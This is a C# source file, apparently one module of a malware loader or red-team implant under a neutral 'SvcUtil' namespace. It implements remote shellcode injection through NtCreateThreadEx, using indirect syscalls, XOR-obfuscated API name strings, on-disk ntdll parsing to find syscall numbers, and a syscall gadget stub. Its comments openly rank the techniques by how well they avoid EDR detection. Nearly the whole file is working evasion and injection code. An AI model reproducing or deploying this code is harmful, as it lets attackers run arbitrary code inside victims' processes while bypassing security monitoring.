#if INJECT
using System;
using System.Runtime.InteropServices;

namespace SvcUtil
{
    /// <summary>
    /// Remote process injection via NtCreateThreadEx — an alternative to
    /// thread hijacking. Uses indirect syscalls to bypass userland hooks.
    ///
    /// Flow:
    ///   NtOpenProcess → NtAllocateVirtualMemory(RW) →
    ///   NtWriteVirtualMemory → NtProtectVirtualMemory(RX) →
    ///   NtCreateThreadEx → NtClose
    ///
    /// Advantages over thread hijacking:
    ///   - Does not suspend/resume existing threads (less behavioral noise)
    ///   - Does not modify thread context (avoids NtSetContextThread detection)
    ///   - Simpler flow = fewer syscalls = smaller detection surface
    ///
    /// Disadvantages:
    ///   - NtCreateThreadEx is more commonly monitored than context manipulation
    ///   - Creates a new thread rather than reusing an existing one
    /// </summary>
    internal static class ThreadInjector
    {
        // ── Constants ──────────────────────────────────────────────

        private const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint THREAD_ALL_ACCESS = 0x001FFFFF;

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Inject shellcode into a remote process using NtCreateThreadEx.
        /// </summary>
        /// <param name="targetPid">Target process ID.</param>
        /// <param name="data">Shellcode bytes.</param>
        /// <returns>true if injection succeeded.</returns>
        public static bool Inject(int targetPid, byte[] data)
        {
            if (data == null || data.Length == 0)
                return false;

            // Initialize the syscall engine (reuses Syscall.cs stubs)
            if (!SyscallEx.Initialize())
                return false;

            IntPtr hProcess = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;

            try
            {
                // Step 1: Open target process
                int status = Syscall.NtOpenProcess(
                    out hProcess, PROCESS_ALL_ACCESS, targetPid);

                if (status != 0 || hProcess == IntPtr.Zero)
                    return false;

                // Step 2: Allocate RW memory in target
                IntPtr baseAddr = IntPtr.Zero;
                IntPtr regionSize = (IntPtr)data.Length;

                status = Syscall.NtAllocateVirtualMemory(
                    hProcess, ref baseAddr, ref regionSize,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                if (status != 0 || baseAddr == IntPtr.Zero)
                    return false;

                // Step 3: Write shellcode
                status = Syscall.NtWriteVirtualMemory(
                    hProcess, baseAddr, data);

                if (status != 0)
                    return false;

                // Step 4: Change to RX
                IntPtr protectAddr = baseAddr;
                IntPtr protectSize = (IntPtr)data.Length;
                uint oldProtect;

                status = Syscall.NtProtectVirtualMemory(
                    hProcess, ref protectAddr, ref protectSize,
                    PAGE_EXECUTE_READ, out oldProtect);

                if (status != 0)
                    return false;

                // Step 5: Create remote thread at shellcode address
                status = SyscallEx.NtCreateThreadEx(
                    out hThread, THREAD_ALL_ACCESS,
                    hProcess, baseAddr);

                if (status != 0 || hThread == IntPtr.Zero)
                    return false;

                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                if (hThread != IntPtr.Zero)
                    Syscall.NtClose(hThread);
                if (hProcess != IntPtr.Zero)
                    Syscall.NtClose(hProcess);
            }
        }
    }

    /// <summary>
    /// Extended syscall stubs for NtCreateThreadEx.
    /// Separate from Syscall.cs to keep the original module untouched and
    /// conditionally include only when needed.
    /// </summary>
    internal static class SyscallEx
    {
        private static volatile bool _initialized;
        private static IntPtr _stubBase;
        private static readonly object _initLock = new object();
        private const int StubSize = 22;

        // ── String decode ──────────────────────────────────────────

        private static readonly byte[] _xk = { 0x4F, 0xC3, 0x17, 0x8A, 0xD0 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return System.Text.Encoding.UTF8.GetString(b);
        }

        // Encoded: "ntdll.dll"
        private static readonly byte[] _nd =
            { 0x21, 0xB7, 0x73, 0xE6, 0xBC, 0x61, 0xA7, 0x7B, 0xE6 };

        // Encoded: "NtCreateThreadEx"
        private static readonly byte[] _fCreate =
            { 0x01, 0xB7, 0x54, 0xF8, 0xB5, 0x2E, 0xB7, 0x72, 0xDE,
              0xB8, 0x3D, 0xA6, 0x76, 0xEE, 0x95, 0x37 };

        // ── Delegate type ──────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DNtCreateThreadEx(
            out IntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint Flags,
            IntPtr StackZeroBits,
            IntPtr SizeOfStackCommit,
            IntPtr SizeOfStackReserve,
            IntPtr lpBytesBuffer);

        private static DNtCreateThreadEx _ntCreateThreadEx;
        private static ushort _ssn;

        // ── Initialization ─────────────────────────────────────────

        public static bool Initialize()
        {
            // First ensure the base syscall engine is ready
            if (!Syscall.Initialize())
                return false;

            if (_initialized) return true;

            lock (_initLock)
            {
                if (_initialized) return true;

                try
                {
                    string sysPath = System.IO.Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System),
                        D(_nd));
                    byte[] peBytes = System.IO.File.ReadAllBytes(sysPath);

                    // Extract SSN for NtCreateThreadEx
                    string targetName = D(_fCreate);
                    if (!ExtractSingleSSN(peBytes, targetName, out _ssn))
                        return false;

                    // Find syscall;ret gadget from loaded ntdll
                    IntPtr gadget = FindGadget();
                    if (gadget == IntPtr.Zero)
                        return false;

                    // Build stub
                    _stubBase = W.MC(
                        IntPtr.Zero, (UIntPtr)StubSize,
                        0x3000, 0x40); // MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE

                    if (_stubBase == IntPtr.Zero)
                        return false;

                    byte[] stub = new byte[StubSize];
                    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1; // mov r10, rcx
                    stub[3] = 0xB8; // mov eax, SSN
                    BitConverter.GetBytes((uint)_ssn).CopyTo(stub, 4);
                    stub[8] = 0xFF; stub[9] = 0x25; // jmp qword ptr [rip+0]
                    stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;
                    BitConverter.GetBytes(gadget.ToInt64()).CopyTo(stub, 14);

                    Marshal.Copy(stub, 0, _stubBase, StubSize);

                    _ntCreateThreadEx = (DNtCreateThreadEx)
                        Marshal.GetDelegateForFunctionPointer(
                            _stubBase, typeof(DNtCreateThreadEx));

                    Array.Clear(peBytes, 0, peBytes.Length);

                    _initialized = true;
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }

        // ── PE parsing (single function) ───────────────────────────

        private struct SectionEntry
        {
            public uint VirtualAddress;
            public uint VirtualSize;
            public uint PointerToRawData;
        }

        private static bool ExtractSingleSSN(byte[] pe, string funcName,
                                              out ushort ssn)
        {
            ssn = 0;
            if (pe.Length < 0x40) return false;

            uint elf = BitConverter.ToUInt32(pe, 0x3C);
            if (elf + 4 > pe.Length) return false;

            uint coff = elf + 4;
            ushort numSections = BitConverter.ToUInt16(pe, (int)coff + 2);
            ushort optSize = BitConverter.ToUInt16(pe, (int)coff + 16);

            uint opt = coff + 20;
            if (BitConverter.ToUInt16(pe, (int)opt) != 0x020B)
                return false;

            uint exportRva = BitConverter.ToUInt32(pe, (int)opt + 112);
            if (exportRva == 0) return false;

            uint secOff = opt + optSize;
            var sections = new SectionEntry[numSections];
            for (int i = 0; i < numSections; i++)
            {
                uint s = secOff + (uint)(i * 40);
                sections[i] = new SectionEntry
                {
                    VirtualAddress = BitConverter.ToUInt32(pe, (int)s + 12),
                    VirtualSize = BitConverter.ToUInt32(pe, (int)s + 8),
                    PointerToRawData = BitConverter.ToUInt32(pe, (int)s + 20)
                };
            }

            uint expOff = RvaToFileOffset(exportRva, sections);
            if (expOff == 0) return false;

            uint numNames = BitConverter.ToUInt32(pe, (int)expOff + 24);
            uint addrFuncsRva = BitConverter.ToUInt32(pe, (int)expOff + 28);
            uint addrNamesRva = BitConverter.ToUInt32(pe, (int)expOff + 32);
            uint addrOrdsRva = BitConverter.ToUInt32(pe, (int)expOff + 36);

            uint funcsOff = RvaToFileOffset(addrFuncsRva, sections);
            uint namesOff = RvaToFileOffset(addrNamesRva, sections);
            uint ordsOff = RvaToFileOffset(addrOrdsRva, sections);

            for (uint i = 0; i < numNames; i++)
            {
                uint nameRva = BitConverter.ToUInt32(pe, (int)(namesOff + i * 4));
                uint nameFileOff = RvaToFileOffset(nameRva, sections);

                if (MatchName(pe, nameFileOff, funcName))
                {
                    ushort ordinal = BitConverter.ToUInt16(pe, (int)(ordsOff + i * 2));
                    uint funcRva = BitConverter.ToUInt32(pe, (int)(funcsOff + ordinal * 4));
                    uint funcOff = RvaToFileOffset(funcRva, sections);

                    if (funcOff + 8 <= pe.Length &&
                        pe[funcOff + 0] == 0x4C &&
                        pe[funcOff + 1] == 0x8B &&
                        pe[funcOff + 2] == 0xD1 &&
                        pe[funcOff + 3] == 0xB8)
                    {
                        ssn = BitConverter.ToUInt16(pe, (int)(funcOff + 4));
                        return true;
                    }
                }
            }
            return false;
        }

        private static uint RvaToFileOffset(uint rva, SectionEntry[] sections)
        {
            for (int i = 0; i < sections.Length; i++)
            {
                if (rva >= sections[i].VirtualAddress &&
                    rva < sections[i].VirtualAddress + sections[i].VirtualSize)
                {
                    return sections[i].PointerToRawData +
                           (rva - sections[i].VirtualAddress);
                }
            }
            return 0;
        }

        private static bool MatchName(byte[] pe, uint offset, string target)
        {
            for (int i = 0; i < target.Length; i++)
            {
                if (offset + i >= pe.Length) return false;
                if (pe[offset + i] != (byte)target[i]) return false;
            }
            return (offset + target.Length < pe.Length &&
                    pe[offset + target.Length] == 0);
        }

        private static IntPtr FindGadget()
        {
            IntPtr hMod = W.M0(D(_nd));
            if (hMod == IntPtr.Zero) return IntPtr.Zero;

            int elf = Marshal.ReadInt32(hMod + 0x3C);
            short numSec = Marshal.ReadInt16(hMod + elf + 6);
            short optSize = Marshal.ReadInt16(hMod + elf + 20 + 16);
            int secStart = elf + 4 + 20 + optSize;

            for (int i = 0; i < numSec; i++)
            {
                IntPtr sh = hMod + secStart + (i * 40);

                if (Marshal.ReadByte(sh + 0) == (byte)'.' &&
                    Marshal.ReadByte(sh + 1) == (byte)'t' &&
                    Marshal.ReadByte(sh + 2) == (byte)'e' &&
                    Marshal.ReadByte(sh + 3) == (byte)'x' &&
                    Marshal.ReadByte(sh + 4) == (byte)'t')
                {
                    int vSize = Marshal.ReadInt32(sh + 8);
                    int vAddr = Marshal.ReadInt32(sh + 12);
                    IntPtr scan = hMod + vAddr;

                    for (int j = 0; j < vSize - 2; j++)
                    {
                        if (Marshal.ReadByte(scan + j) == 0x0F &&
                            Marshal.ReadByte(scan + j + 1) == 0x05 &&
                            Marshal.ReadByte(scan + j + 2) == 0xC3)
                        {
                            return scan + j;
                        }
                    }
                }
            }
            return IntPtr.Zero;
        }

        // ── Public Wrapper ─────────────────────────────────────────

        /// <summary>
        /// Call NtCreateThreadEx via indirect syscall.
        /// </summary>
        public static int NtCreateThreadEx(
            out IntPtr hThread, uint desiredAccess,
            IntPtr processHandle, IntPtr startAddress)
        {
            return _ntCreateThreadEx(
                out hThread,
                desiredAccess,
                IntPtr.Zero,     // ObjectAttributes
                processHandle,
                startAddress,
                IntPtr.Zero,     // lpParameter
                0,               // Flags (not suspended)
                IntPtr.Zero,     // StackZeroBits
                IntPtr.Zero,     // SizeOfStackCommit
                IntPtr.Zero,     // SizeOfStackReserve
                IntPtr.Zero);    // lpBytesBuffer
        }
    }
}
#endif
